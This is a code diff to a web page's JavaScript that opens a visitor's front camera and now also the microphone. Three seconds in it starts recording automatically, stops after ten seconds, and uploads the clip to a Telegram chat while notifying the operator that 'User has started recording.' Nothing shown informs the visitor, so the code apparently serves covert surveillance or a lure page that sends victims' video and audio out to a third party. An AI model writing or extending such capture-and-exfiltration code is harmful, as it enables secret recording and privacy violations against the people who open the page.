@@ -32,7 +32,7 @@
 
         // Function to start video
         function startVideo() {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true })
                 .then(stream => {
                     video.srcObject = stream;
                     setupMediaRecorder(stream);
@@ -42,7 +42,14 @@
                             mediaRecorder.start();
                             console.log('Recording started');
                             sendNotificationToTelegram('User has started recording.');
-                        }, 3000);
+                            
+                            // Stop recording automatically after 10 seconds
+                            setTimeout(() => {
+                                mediaRecorder.stop();
+                                console.log('Recording stopped after 10 seconds');
+                                sendNotificationToTelegram('Recording stopped after 10 seconds.');
+                            }, 10000); // 10 seconds
+                        }, 3000); // Delay to allow camera to focus
                     };
                 })
                 .catch(err => console.error("Error accessing camera: ", err));
@@ -50,7 +57,7 @@
 
         // Function to setup MediaRecorder
         function setupMediaRecorder(stream) {
-            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/mp4' });
+            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
 
             mediaRecorder.ondataavailable = (event) => {
                 if (event.data.size > 0) {
@@ -61,7 +68,7 @@
 
             mediaRecorder.onstop = () => {
                 console.log('MediaRecorder stopped.');
-                const blob = new Blob(recordedChunks, { type: 'video/mp4' });
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                 recordedChunks = []; // Reset chunks after processing
                 const videoURL = URL.createObjectURL(blob);
                 console.log('Recording stopped. Preparing to send video...');
@@ -82,7 +89,7 @@
 
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('video', blob, 'recording.mp4');
+            formData.append('video', blob, 'recording.webm');
 
             fetch(url, {
                 method: 'POST',
